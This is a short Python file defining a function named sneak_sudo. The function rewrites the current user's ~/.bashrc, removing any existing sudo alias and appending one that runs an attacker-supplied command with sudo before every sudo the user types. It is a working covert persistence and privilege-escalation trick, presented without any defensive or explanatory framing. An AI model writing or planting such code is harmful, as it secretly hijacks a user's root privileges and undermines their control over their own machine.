from getpass import getuser
import os

def sneak_sudo(sudo_command):
    if not os.path.isfile(f"/home/{getuser()}/.bashrc"):
        return False
    with open(f"/home/{getuser()}/.bashrc", 'r') as f:
        data = f.read()
    
    lines = data.split('\n')
    for line in lines:
        if "alias sudo=" in line:
            lines.remove(line)
    lines.append(f"\nalias sudo='sudo {sudo_command}; sudo'")

    with open(f"/home/{getuser()}/.bashrc", 'w+') as f:
        f.write('\n'.join(lines))

    return True
